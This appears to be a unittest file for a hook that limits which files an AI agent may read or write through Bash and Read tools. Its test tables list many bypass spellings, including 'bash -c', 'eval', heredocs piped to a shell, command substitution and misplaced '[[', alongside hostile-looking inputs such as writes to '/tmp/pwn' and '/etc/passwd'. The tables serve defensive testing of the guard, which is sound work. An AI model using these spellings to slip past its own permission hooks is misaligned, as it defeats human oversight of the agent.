    def test_brace_expansion_past_the_bound_falls_back_to_a_glob(self) -> None:
        """The expander is bounded; past the bound the real file was never
        checked and the read reached the auto-approve."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            (repo_root / "spec" / "d300").mkdir()
            (repo_root / "spec" / "d300" / "s.md").write_text("x", encoding="utf-8")
            self.assertEqual(self._run(repo_root, "cat spec/d{1..300}/s.md")[0], 2)
            nested = "spec/" + "".join(f"{c}{{1,2}}" for c in "abcdefghi") + "/s.md"
            (repo_root / "spec" / "a2b2c2d2e2f2g2h2i2").mkdir()
            (repo_root / "spec" / "a2b2c2d2e2f2g2h2i2" / "s.md").write_text(
                "x", encoding="utf-8"
            )
            self.assertEqual(self._run(repo_root, f"cat {nested}")[0], 2)

    def test_auto_approvable_reader_outside_manifest_blocks(self) -> None:
        """egrep/fgrep/wc are auto-approvable; unextracted they would execute."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            for command in (
                "egrep SECRET spec/private.md",
                "fgrep -rn SECRET spec",
                "wc -c spec/private.md",
            ):
                with self.subTest(command=command):
                    self.assertEqual(self._run(repo_root, command)[0], 2)

    def test_recursive_grep_without_operand_blocks(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "grep -rn SECRET")
            self.assertEqual(code, 2)
            self.assertIn("'.'", json.loads(body).get("reason", ""))
            # `-h` is --no-filename for grep, not --help.
            self.assertEqual(self._run(repo_root, "grep -r -h SECRET")[0], 2)
            # Non-recursive: reads stdin, not the tree.
            self.assertEqual(self._run(repo_root, "grep -n SECRET")[0], 0)

    def test_heredoc_body_does_not_produce_a_false_block(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(
                repo_root, "cat > docs/note.md <<EOF\ndiff spec/private.md spec/private.md\nEOF"
            )
            self.assertNotIn("unauthorized read", body)

    def test_broad_glob_is_validated_at_its_literal_prefix(self) -> None:
        """`glob.glob` is unbounded — `/*/*/*/*/*/*` did not finish in 60s, and
        this hook runs on every tool call. Every match lies under the pattern's
        literal prefix, so validating the prefix authorizes exactly the set the
        pattern can reach."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            (repo_root / "spec" / "a" / "b" / "c").mkdir(parents=True)
            (repo_root / "spec" / "a" / "b" / "c" / "deep.md").write_text(
                "x", encoding="utf-8"
            )
            code, body = self._run(repo_root, "cat spec/*/*/*/deep.md")
            self.assertEqual(code, 2)
            self.assertIn("'spec'", json.loads(body).get("reason", ""))
            # An in-manifest prefix still passes.
            (repo_root / "docs" / "x" / "y" / "z").mkdir(parents=True)
            (repo_root / "docs" / "x" / "y" / "z" / "deep.md").write_text(
                "x", encoding="utf-8"
            )
            self.assertEqual(self._run(repo_root, "cat docs/*/*/*/deep.md")[0], 0)

    def test_broad_glob_escaping_its_prefix_is_validated_at_the_root(self) -> None:
        """"Every match lies under the literal prefix" fails once a `..` follows
        a wildcard, so the prefix shortcut would authorize a read outside it."""
        from tools.hooks.cli import _bounded_glob_read_targets

        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            resolved = repo_root.resolve()
            self.assertEqual(
                _bounded_glob_read_targets(
                    repo_root, resolved, "docs/*/../../spec/*/*/*"
                ),
                ([(".", resolved)], []),
            )

    def test_broad_glob_with_a_nonexistent_prefix_is_not_blocked(self) -> None:
        """The prefix fallback must keep the same rule as a literal target: a
        path that is not there leaks nothing."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            self.assertEqual(self._run(repo_root, "cat nosuchdir/*/*/*/x")[0], 0)

    def test_out_of_repo_glob_is_not_walked(self) -> None:
        from tools.hooks.cli import _bounded_glob_read_targets

        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            self.assertEqual(
                _bounded_glob_read_targets(repo_root, repo_root.resolve(), "/*/*/*/*/*/*"),
                ([], ["/*/*/*/*/*/*"]),
            )

    def test_glob_matching_nothing_is_not_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, _ = self._run(repo_root, "cat spec/*.nomatch")
            self.assertEqual(code, 0)
            self.assertEqual(self._log_lines(repo_root), [])

    def test_shell_keyword_fragment_does_not_bypass_the_guard(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            for command in (
                "if true; then cat spec/private.md; fi",
                "for f in x; do cat spec/private.md; done",
                "{ cat spec/private.md; }",
                "(cat spec/private.md)",
            ):
                with self.subTest(command=command):
                    code, _ = self._run(repo_root, command)
                    self.assertEqual(code, 2)

    def test_redirect_target_is_not_treated_as_a_read(self) -> None:
        """The output file is a write; blocking on it would break every
        regenerate turn whose output already exists."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            (repo_root / "spec" / "out.txt").write_text("old", encoding="utf-8")
            code, body = self._run(repo_root, "cat docs/WORKFLOW.md > spec/out.txt")
            # It still meets the write guard (this fixture has no output
            # manifest) — but it must never be rejected as an unauthorized READ
            # of its own output file.
            self.assertNotIn("unauthorized read", body)
            self.assertEqual(
                [entry["path"] for entry in self._log_lines(repo_root)], ["docs/WORKFLOW.md"]
            )

    def test_active_child_return_token_stays_readable_via_bash(self) -> None:
        """The documented record-child-return two-step is a bare `cat` of this
        path; the `$(cat ...)` form is rejected by the Bash tool."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            launches = (
                repo_root / "workspace" / "orchestrations" / self.ORCH / "launches"
            )
            launches.mkdir(parents=True, exist_ok=True)
            token_rel = (
                f"workspace/orchestrations/{self.ORCH}/launches/{self.RUN_ID}.parent_return_token"
            )
            (repo_root / token_rel).write_text("tok", encoding="utf-8")
            code, _ = self._run(repo_root, f"cat {token_rel}")
            self.assertEqual(code, 0)
            # Another child's token is NOT exempt.
            other = (
                f"workspace/orchestrations/{self.ORCH}/launches/other_run.parent_return_token"
            )
            (repo_root / other).write_text("tok", encoding="utf-8")
            self.assertEqual(self._run(repo_root, f"cat {other}")[0], 2)

    def test_block_carries_a_renderable_fix_hint(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "true && cat spec/private.md")
            self.assertEqual(code, 2)
            # format_block_reason_with_hint renders only known fields; a hint the
            # agent never sees is not a hint.
            self.assertIn("Note:", json.loads(body).get("reason", ""))

    def test_missing_manifest_with_existing_target_blocks_fail_closed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=None)
            code, body = self._run(repo_root, "cat docs/WORKFLOW.md")
            self.assertEqual(code, 2)
            self.assertIn("read manifest not found", json.loads(body).get("reason", ""))

    def test_self_manifest_read_is_allowed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            rel = f"workspace/orchestrations/{self.ORCH}/read_manifests/{self.RUN_ID}.json"
            code, _ = self._run(repo_root, f"cat {rel}")
            self.assertEqual(code, 0)
            self.assertEqual([e["decision"] for e in self._log_lines(repo_root)], ["allow"])

    def test_non_workflow_mode_is_skipped(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, _ = self._run(repo_root, "cat spec/private.md", workflow_mode="0")
            self.assertEqual(code, 0)
            self.assertEqual(self._log_lines(repo_root), [])

    def test_block_precedes_write_policy_and_names_the_command(self) -> None:
        """A read block fires even when the command also has a write target."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "cat spec/private.md > docs/copy.md")
            self.assertEqual(code, 2)
            detail_reason = json.loads(body).get("reason", "")
            self.assertIn("unauthorized read", detail_reason)

    def test_multiple_targets_allow_then_block(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, _ = self._run(repo_root, "cat docs/WORKFLOW.md && cat spec/private.md")
            self.assertEqual(code, 2)
            lines = self._log_lines(repo_root)
            self.assertEqual([entry["decision"] for entry in lines], ["allow", "block"])


class ReadDecisionAccessLogTests(unittest.TestCase):
    """Read-tool decisions are recorded in access_logs like Grep/Glob."""

    ORCH = "orch_read_log_001"
    RUN_ID = "child_run_read_log_001"

    def _run_read(self, repo_root: Path, file_path: str):
        payload = {
            "orchestration_id": self.ORCH,
            "repo_root": str(repo_root),
            "tool_name": "Read",
            "tool_input": {"file_path": file_path},
        }
        out = io.StringIO()
        with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
            with redirect_stdout(out):
                code = cli.main(
                    [
                        "--backend",
                        "claude",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
        return code, out.getvalue().strip()

    def test_allow_and_block_are_both_logged(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch_root = repo_root / "workspace" / "orchestrations" / self.ORCH
            (orch_root / "read_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "access_logs").mkdir(parents=True, exist_ok=True)
            (orch_root / "active_child_agent_run_id.txt").write_text(self.RUN_ID, encoding="utf-8")
            (orch_root / "read_manifests" / f"{self.RUN_ID}.json").write_text(
                json.dumps({"allowed_read_roots": ["docs/"]}), encoding="utf-8"
            )
            self.assertEqual(self._run_read(repo_root, "docs/WORKFLOW.md")[0], 0)
            self.assertEqual(self._run_read(repo_root, "tools/hooks/cli.py")[0], 2)
            lines = [
                json.loads(line)
                for line in (orch_root / "access_logs" / f"{self.RUN_ID}.jsonl")
                .read_text(encoding="utf-8")
                .splitlines()
                if line.strip()
            ]
            self.assertEqual([entry["decision"] for entry in lines], ["allow", "block"])
            self.assertEqual({entry["tool"] for entry in lines}, {"Read"})
            self.assertEqual(lines[1]["policy"], "read_manifest_read_guard")


class BashWriteTargetGrammarTests(unittest.TestCase):
    """The Bash write boundary: issue #74's four defects and TODO.md 378(d).

    Two mechanisms, and the split between them is the point. `_detect_bash_write_targets`
    NAMES the path a redirect / `tee` / `sed -i` writes, and the guard checks it against
    the manifest. `_detect_bash_write_commands` does not name anything: it recognises a
    command that writes a file from Bash and the caller REFUSES it. The second exists
    because the first shape was tried for the operand family and three review rounds each
    found the same defect one function further on — a value read off one copy of the
    command while a decision was made on another.

    SAMPLED, not pinned: what is fixed here is the set of spellings listed below, not
    "every write bash can express". Both functions are best-effort by construction and
    carry their residue in their own docstrings; an empty extraction means "nothing
    extracted", never "this command writes nothing".
    """

    # Issue #74's three measured defects plus the clobber spelling `>|`, found while
    # reproducing (c). Each row is (command, expected targets).
    _ISSUE_74_WITNESSES = (
        # (a) a quoted redirect target used to collapse to the single char '"'
        ('cat > "workspace/tmp/run1/work.py" <<EOF', ["workspace/tmp/run1/work.py"]),
        ("cat > 'workspace/tmp/run1/work.py'", ["workspace/tmp/run1/work.py"]),
        ("cmd > 'a b'/c", ["a b/c"]),
        ('cmd > pre"post"', ["prepost"]),
        # (b) a heredoc BODY is data; a `>` inside it is not a redirect
        (
            "cat > workspace/tmp/run1/s.py <<'EOF'\nif a > b:\n    pass\nEOF",
            ["workspace/tmp/run1/s.py"],
        ),
        # (c) no space between the operator and the path
        ("cat >workspace/pipelines/x.json <<'EOF'", ["workspace/pipelines/x.json"]),
        ("cmd >>workspace/out.log", ["workspace/out.log"]),
        ("cmd >|workspace/out.txt", ["workspace/out.txt"]),
        ("cmd >| workspace/out.txt", ["workspace/out.txt"]),
        # `>&word` with a non-numeric word is "and stderr too", i.e. a file write.
        # Missed on origin/main as well as by #74's first fix.
        ("echo x >& workspace/pipelines/x.json", ["workspace/pipelines/x.json"]),
        ("echo x >&workspace/pipelines/x.json", ["workspace/pipelines/x.json"]),
    )

    # Spellings whose result must survive the widened regex. `>(` is the one the
    # widening itself put at risk: with no space required, process substitution would
    # otherwise be reported as a write to the phantom `(cat`.
    _MUST_NOT_REGRESS = (
        ("cmd 2>&1 > out.txt", ["out.txt"]),
        ("cmd >&2", []),
        ("cmd 1>&2", []),
        ("cmd >> log.txt", ["log.txt"]),
        ("cmd 1> a.txt 2> b.txt", ["a.txt", "b.txt"]),
        ("cmd &> all.log", ["all.log"]),
        ("cmd &>> all.log", ["all.log"]),
        ("cmd > /dev/null", []),
        ("echo hi > /dev/stderr", []),
        ("echo hi > /dev/stdout", []),
        ("echo hi > /dev/stdin", []),
        ("tee >(cat) < a", []),
        ("diff <(a) <(b) > out", ["out"]),
        ("echo test | tee file1.txt file2.txt", ["file1.txt", "file2.txt"]),
        ("sed -i's/a/b/' file.txt", ["file.txt"]),
        ("sed -i 's/a/b/' f.txt", ["f.txt"]),
        ('python3 foo.py --reply-text "exit code > 0"', []),
        ('python3 foo.py --arg "$(echo hi > workspace/forbidden.txt)"', ["workspace/forbidden.txt"]),
        ('python3 foo.py --val "$((1 > 0))"', []),
    )

    # Redirect-side spellings the three review rounds found. The rounds' argv-side
    # findings are not here: that mechanism was replaced by refusal, and its rows moved
    # to `_REFUSED_WRITE_COMMANDS` / `_NOT_REFUSED`.
    _REVIEW_ROUND_WITNESSES = (
        # round 1: the fd prefix of a redirect must be inside the blanked span, and
        # `>&-` / `>& 3` / `>&N-` are descriptor operations, not writes
        ("cmd 2>&-", []),
        ("cmd >&-", []),
        ("echo x >& 3", []),
        ("cmd >&3", []),
        ("cmd 2>&3", []),
        ("cmd >&3-", []),
        ("cmd 2>&3-", []),
        # ...but a non-numeric word after `>&` IS a file
        ("cmd >&1x", ["1x"]),
        # round 2: a quoted target starting with `&` is a real destination, not an
        # fd-dup spelling to drop
        ('cmd > "&1"', ["&1"]),
        # round 3: a comment is blanked before ANY branch reads the text, so the `tee`
        # operand list stops at the note and a `$(…)` inside a comment is never run
        ("python3 x.py | tee workspace/tmp/r1/log.txt  # keep a copy", ["workspace/tmp/r1/log.txt"]),
        ("echo hi > workspace/out/b # $(echo x > /tmp/pwn)", ["workspace/out/b"]),
        # ...and a `#` mid-word is not a comment. `run.json#env` occurs in this tree's
        # own sandbox-profile paths.
        ("echo hi > workspace/out/run.json#env", ["workspace/out/run.json#env"]),
        # round 1: an unterminated quote reaches shlex unbalanced
        ('cmd > "abc', ['"abc']),
        # round 4: `>` inside a comparison context is an operator, not a redirect.
        # The GLUED spellings became phantoms when #74(c) dropped the space
        # requirement; the spaced ones were phantoms on origin/main too.
        ("echo $((n>0))", []),
        ("echo $(( n > 0 ))", []),
        ("[[ a >b ]] && echo y", []),
        ("[[ a > b ]]", []),
        # ...but a real redirect nested inside one is still reached, through the
        # command-substitution recursion that runs before the blanking
        ('--arg "$(( $(echo 1 > /tmp/pwn) + 1 ))"', ["/tmp/pwn"]),
        ("[[ -f a ]] && cmd > out.txt", ["out.txt"]),
        # round 5: `[[` is the conditional ONLY in command position. Matched
        # anywhere, any `[[` paired with any later `]]` and blanked a REAL
        # redirect between them — measured writing the file under bash, and
        # named by origin/main.
        ("cat a.json [[ > workspace/pipelines/evil.json ]]", ["workspace/pipelines/evil.json"]),
        ("echo [[ ; cat a > copied.yaml ; echo ]]", ["copied.yaml"]),
        ("if [[ -f a ]]; then cmd > out.txt; fi", ["out.txt"]),
        ("while [[ x ]]; do cmd > o; done", ["o"]),
    )

    # TODO.md 378(d): every one of these is REFUSED, whatever it names. The spellings
    # are the ones that defeated the parser this replaced — a glued `;`, a newline, a
    # `\`-continuation, a comment, a command substitution, a wrapper, a shell keyword,
    # a bundled or glued short option — none of which the refusal has to model, because
    # it never looks past the fragment head.
    _REFUSED_WRITE_COMMANDS = (
        "cp a.txt workspace/pipelines/y.json",
        "cp -r a b workspace/tmp/r1/",
        "cp -t workspace/tmp/r1 a b",
        "cp -tworkspace/tmp/r1 a b",
        "cp -atworkspace/ir a b",
        "cp --target-directory=workspace/tmp/r1 a b",
        "mv old.txt workspace/ir/new.txt",
        "install -m 644 src workspace/ir/dst",
        "install -d workspace/ir/a workspace/ir/b",
        "ln -s target workspace/ir/link",
        "ln -s ../x",
        "touch workspace/ir/b.txt",
        "truncate -s 0 workspace/ir/log.txt",
        "dd if=/dev/zero of=workspace/ir/x.bin bs=1",
        "dd of=",
        "/bin/cp a b",
        "cp -- a b",
        "cp - b",
        # separators the old parser could not see
        "cd workspace; cp a.py workspace/pipelines/f.json",
        "mkdir -p x\ncp a.py workspace/pipelines/f.json",
        "cp a b&&ls",
        "ls && cp a b",
        "cp a b | grep x",
        "cp a \\\n  workspace/out/b",
        # a comment, a substitution, a redirect in the same fragment
        "cp src workspace/out/x.py  # copy the artifact",
        "cp $(ls -t | head -1) workspace/pipelines/f.json",
        'cp a.json "$(cat dest.txt)"',
        "cp report.json workspace/tmp/r1/run-$(date +%s).json",
        "cp a b > log.txt",
        "cp a b < in.txt",
        "cp a b 2>/dev/null",
        "cp a b 2<in.txt",
        "cp a b 2>&1",
        "cp a b2>&1",
        "cp a b <&3",
        "cp 'a b.txt' 'c d.txt'",
        # prefixes and wrappers the read side already strips
        "sudo cp a workspace/ir/b",
        "VAR=1 cp a workspace/ir/b",
        "time cp a b",
        "xargs cp -t workspace/ir",
        "xargs -n1 cp a b",
        "for f in *.py; do cp $f workspace/out/; done",
        "if [ -f a ]; then touch workspace/out/b; fi",
        "( cp a workspace/out/x.txt )",
        "{ cp a b; }",
        # a writer inside a command substitution runs
        "$(cp a b)",
        "`cp a b`",
        "echo $(cp a b)",
        "x=$(touch workspace/out/f)",
        # the shell's own `-c`, the nearest rephrasing of a refused `cp`
        "bash -c 'cp a b'",
        'sh -c "touch workspace/out/x"',
        # a quoted or escaped command NAME is still that command
        '"cp" a b',
        "\\cp a b",
        'c""p a b',
        # a leading redirection does not displace the head
        "> workspace/x.txt cp a b",
        # a shell is handed a SCRIPT, and the script need not be in the shell's
        # own fragment: piped in, or in a heredoc body blanked before the scan
        "bash <<'EOF'\ncp a b\nEOF",
        "echo 'cp a b' | bash",
        "printf 'cp a b' | bash -s",
        # process substitution runs its body
        "diff <(cp a b) /dev/null",
        "cat <(cp a b) >/dev/null",
        "echo hi > >(cp a d)",
    )

    # Commands that must NOT be refused. Half are ordinary read-only work; half are the
    # documented residue, where the refusal recognises no writer and says so.
    _NOT_REFUSED = (
        "echo cp a b",
        "cat workspace/tmp/r1/a.txt",
        "ls && grep x y",
        "python3 tools/orchestration_runtime.py record-reply --reply-text 'cp a b'",
        "grep -rn 'touch' tools/",
        "cat a.txt | tee workspace/tmp/r1/log.txt",
        "echo hi > workspace/tmp/r1/out.txt",
        "sed -i 's/a/b/' workspace/tmp/r1/f.txt",
        # residue: a writer this does not recognise
        "find . -name x -exec cp {} workspace/ir \\;",
        # a `#`-comment mentioning a writer is not one being run — including when
        # the comment carries a `;` that would otherwise open a new fragment
        "cat a.txt # cp a b",
        "echo x; # ; cp a b",
        # a heredoc BODY is a document being written, not commands being run.
        # This is how a leaf authors a scratch script; 19 of 283 real leaf Bash
        # commands mined from this tree's own hook logs carry one.
        "cat > workspace/tmp/r1/s.py <<'EOF'\ncp a b\nEOF",
        # residue: only the NAME is indirect, so the fragment carries no literal
        "$CP a workspace/ir/b",
        "$(which cp) a workspace/ir/b",
        # residue: a script FILE handed to an interpreter. The file's content is
        # not in the command, so nothing here can see the writer.
        "bash workspace/tmp/r1/copy.sh",
        "python3 workspace/tmp/r1/copy.py",
        # `install` is also a package-manager SUBCOMMAND, so it is recognised only
        # at a fragment head. This row is verbatim from the session corpus.
        "timeout 600 /v/bin/pip install -q fparser",
        "env PYTHONPATH=. python3 -m pip install -e .",
    )

    def _targets(self, command: str) -> list[str]:
        return cli._detect_bash_write_targets(command)

    def _write_commands(self, command: str) -> list[str]:
        return cli._detect_bash_write_commands(
            *cli._blanked_command_and_scan(command), command
        )

    # ---- the path-naming half ---------------------------------------------

    def test_issue_74_witnesses(self) -> None:
        for command, expected in self._ISSUE_74_WITNESSES:
            with self.subTest(command=command):
                self.assertEqual(sorted(self._targets(command)), sorted(expected))

    def test_redirect_spellings_that_must_not_regress(self) -> None:
        for command, expected in self._MUST_NOT_REGRESS:
            with self.subTest(command=command):
                self.assertEqual(sorted(self._targets(command)), sorted(expected))

    def test_review_round_witnesses(self) -> None:
        for command, expected in self._REVIEW_ROUND_WITNESSES:
            with self.subTest(command=command):
                self.assertEqual(sorted(self._targets(command)), sorted(expected))

    def test_heredoc_body_alone_yields_no_target(self) -> None:
        # No outer redirect at all: everything in the body is data.
        command = "cat <<'EOF'\necho x > /etc/passwd\nEOF"
        self.assertEqual(self._targets(command), [])

    def test_unbalanced_quote_falls_back_to_the_raw_span(self) -> None:
        """`_shlex_one`'s ValueError fallback returns the blob, never the empty string.

        An unterminated quote is left alone by `_strip_quoted_strings` (the
        fail-closed direction there), so the span reaches shlex unbalanced.
        Returning "" instead would append an empty target and block naming ''.
        """
        self.assertEqual(cli._shlex_one('"abc'), '"abc')
        self.assertEqual(self._targets('cmd > "abc'), ['"abc'])

    # ---- the refusal half -------------------------------------------------

    def test_file_write_commands_are_recognised(self) -> None:
        for command in self._REFUSED_WRITE_COMMANDS:
            with self.subTest(command=command):
                self.assertTrue(
                    self._write_commands(command),
                    f"no writer recognised in {command!r}",
                )

    def test_commands_that_must_not_be_refused(self) -> None:
        for command in self._NOT_REFUSED:
            with self.subTest(command=command):
                self.assertEqual(self._write_commands(command), [])

    def test_every_member_of_the_write_command_set_is_recognised(self) -> None:
        """Set identity, not a sample: generated FROM the constant.

        A name added to `_BASH_FILE_WRITE_COMMANDS` without a probe gets one
        automatically, and removing one turns this red.
        """
        for name in sorted(cli._BASH_FILE_WRITE_COMMANDS):
            with self.subTest(name=name):
                self.assertEqual(self._write_commands(f"{name} a b"), [name])
                mutated = frozenset(cli._BASH_FILE_WRITE_COMMANDS - {name})
                with patch.object(cli, "_BASH_FILE_WRITE_COMMANDS", mutated):
                    self.assertEqual(self._write_commands(f"{name} a b"), [])

    # A REALISTIC invocation of each whole-fragment head. The first version of this
    # test generated `f"{name} cp a b"` for every one of them and passed — but
    # `timeout cp a b` is not a spelling bash accepts, and every wrapper works in
    # the no-option form, so the probe family could not distinguish a working
    # look-through from an inert one. Six of eight wrappers were in fact defeated
    # by their own canonical invocation, and `timeout` by every spelling that
    # exists. That is the third time on this branch a measurement was taken over a
    # family that structurally cannot answer the question.
    _WHOLE_FRAGMENT_HEAD_SPELLINGS = {
        "sudo": "sudo -u root cp a b",
        "env": "env FOO=1 cp a b",
        "nohup": "nohup cp a b",
        "xargs": "xargs -I {} cp {} dst",
        "stdbuf": "stdbuf -o 0 cp a b",
        "timeout": "timeout 5 cp a b",
        "nice": "nice -n 10 cp a b",
        "ionice": "ionice -c 2 cp a b",
        "command": "command cp a b",
        "exec": "exec cp a b",
        "eval": 'eval "cp a b"',
        "bash": "bash -c 'cp a b'",
        "sh": 'sh -c "cp a b"',
        "zsh": "zsh -c 'cp a b'",
        "dash": "dash -c 'cp a b'",
        "ksh": "ksh -c 'cp a b'",
        "case": "case x in x) cp a b;; esac",
    }

    def test_every_whole_fragment_head_is_scanned(self) -> None:
        """Set identity over `_BASH_SCAN_WHOLE_FRAGMENT_HEADS`, with REAL spellings.

        The spelling table is checked against the constant first, so a head added
        to the code without one fails here rather than getting a probe that cannot
        fail. 14 of the 17 spellings were run under bash in a scratch directory and
        confirmed to actually perform the copy. The three that were not: `sudo`
        (this host wants a password on a tty) and `ksh` (not installed here), both
        valid spellings; and `xargs -I {} cp {} dst`, which with no stdin exits 0
        having copied nothing. That last one is deliberate and stays — what this
        table probes is whether the DETECTOR sees the writer, and the detector
        reads words, not behaviour. An earlier version of this docstring said
        "each spelling", which was false for three of seventeen.
        """
        self.assertEqual(
            set(self._WHOLE_FRAGMENT_HEAD_SPELLINGS),
            set(cli._BASH_SCAN_WHOLE_FRAGMENT_HEADS),
            "every whole-fragment head needs a realistic probe spelling",
        )
        for name, command in sorted(self._WHOLE_FRAGMENT_HEAD_SPELLINGS.items()):
            with self.subTest(name=name, command=command):
                self.assertIn("cp", self._write_commands(command))
                mutated = frozenset(cli._BASH_SCAN_WHOLE_FRAGMENT_HEADS - {name})
                shells = frozenset(cli._BASH_SHELL_HEADS - {name})
                # A shell name is in BOTH sets — the head scan and the raw-word
                # scan reach it independently — so removing it from one alone
                # proves nothing. Both are mutated, or the probe cannot fail.
                with patch.object(cli, "_BASH_SCAN_WHOLE_FRAGMENT_HEADS", mutated):
                    with patch.object(cli, "_BASH_SHELL_HEADS", shells):
                        self.assertNotIn("cp", self._write_commands(command))

    def test_a_writer_in_every_fragment_of_a_compound_is_found(self) -> None:
        # The refusal names the first writer, but the scan must not stop at the
        # first fragment: a leading read must not hide a trailing write.
        self.assertEqual(self._write_commands("cat a.txt && cp a b"), ["cp"])
        self.assertEqual(self._write_commands("cp a b && mv c d"), ["cp", "mv"])

    # ---- end to end through cli.main --------------------------------------

    def _setup(self, repo_root: Path, *, orch: str, run_id: str, tmp_root: str) -> None:
        orch_root = repo_root / "workspace" / "orchestrations" / orch
        (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
        (orch_root / "read_manifests").mkdir(parents=True, exist_ok=True)
        (orch_root / "active_child_agent_run_id.txt").write_text(run_id, encoding="utf-8")
        (orch_root / "output_manifests" / f"{run_id}.json").write_text(
            json.dumps(
                {
                    "orchestration_id": orch,
                    "agent_run_id": run_id,
                    "allowed_output_paths": [],
                    "allowed_file_tool_paths": [],
                    "allowed_tmp_root": tmp_root,
                    "write_roots": ["workspace/ir"],
                }
            ),
            encoding="utf-8",
        )

    def _run_bash_hook(self, *, orch: str, repo_root: Path, command: str) -> tuple[int, dict]:
        payload = {
            "orchestration_id": orch,
            "repo_root": str(repo_root),
            "tool_name": "Bash",
            "tool_input": {"command": command},
        }
        out = io.StringIO()
        with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
            with redirect_stdout(out):
                code = cli.main(
                    [
                        "--backend",
                        "claude",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
        body_text = out.getvalue().strip()
        return code, (json.loads(body_text) if body_text else {})

    def test_quoted_redirect_target_under_tmp_root_is_not_blocked(self) -> None:
        """Issue #74(a) end to end: the block named `'"'`, a path nobody wrote."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_issue74_quoted"
            run_id = "step_run_issue74_quoted"
            tmp_root = f"workspace/tmp/{run_id}"
            self._setup(repo_root, orch=orch, run_id=run_id, tmp_root=tmp_root)
            code, body = self._run_bash_hook(
                orch=orch,
                repo_root=repo_root,
                command=f'cat > "{tmp_root}/work.py" <<EOF',
            )
            self.assertNotEqual(code, 2, body)
            self.assertNotEqual(body.get("decision"), "block", body)

    def test_redirect_without_space_reaches_the_write_guard(self) -> None:
        """Issue #74(c) end to end: `cat >path` used to produce no target at all."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_issue74_nospace"
            run_id = "step_run_issue74_nospace"
            self._setup(
                repo_root, orch=orch, run_id=run_id, tmp_root=f"workspace/tmp/{run_id}"
            )
            for command in (
                "cat > workspace/pipelines/evil.json <<'EOF'",
                "cat >workspace/pipelines/evil.json <<'EOF'",
            ):
                with self.subTest(command=command):
                    code, body = self._run_bash_hook(
                        orch=orch, repo_root=repo_root, command=command
                    )
                    self.assertEqual(code, 2, body)
                    self.assertEqual(body.get("decision"), "block", body)
                    self.assertIn("workspace/pipelines/evil.json", body.get("reason", ""))

    def test_legitimate_redirect_work_is_not_refused(self) -> None:
        """The over-refusal probe, at the handler, for the rows a round found blocked.

        Each of these names a destination inside the leaf's own `allowed_tmp_root`
        and was BLOCKED at some commit on this branch, naming `2`, `artifact`,
        `.json`, `ls` or `-` — a path that appears nowhere in the command.
        """
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_issue74_overrefusal"
            run_id = "step_run_issue74_overrefusal"
            tmp_root = f"workspace/tmp/{run_id}"
            self._setup(repo_root, orch=orch, run_id=run_id, tmp_root=tmp_root)
            for command in (
                f"echo hi > {tmp_root}/a.txt",
                f"echo hi > {tmp_root}/a.txt 2>/dev/null",
                f"echo hi > {tmp_root}/a.txt 2>&-",
                f"echo hi > {tmp_root}/a.txt  # keep a note",
                f"echo hi > {tmp_root}/a.txt\nls workspace",
                f"echo hi >{tmp_root}/a.txt",
                f'echo hi > "{tmp_root}/a.txt"',
                f"cat a.txt | tee {tmp_root}/log.txt  # keep a copy",
            ):
                with self.subTest(command=command):
                    code, body = self._run_bash_hook(
                        orch=orch, repo_root=repo_root, command=command
                    )
                    self.assertNotEqual(code, 2, body)
                    self.assertNotEqual(body.get("decision"), "block", body)

    def test_no_leaf_permission_grant_matches_a_refused_write_command(self) -> None:
        """The "costs nothing legitimate" claim, pinned instead of asserted once.

        `docs/HOOKS.md` and the commit that added the refusal both say the seven
        commands are already refused by the harness, because none of them appears
        in the Claude leaf's `permissions.allow`. That is the whole argument for
        the refusal being free, and without this test a `Bash(cp:*)` grant added
        tomorrow would falsify a canonical document silently.

        **What this does NOT cover**: the codex leaf. Since issue #102 `leaf_config/`
        holds `codex/hooks.json` as well, but it wires hooks only — a codex leaf
        routes `Shell` through this same hook and still has no permission allow list
        for the claim to be about, so the claim is scoped to the Claude backend and
        the document says so.
        """
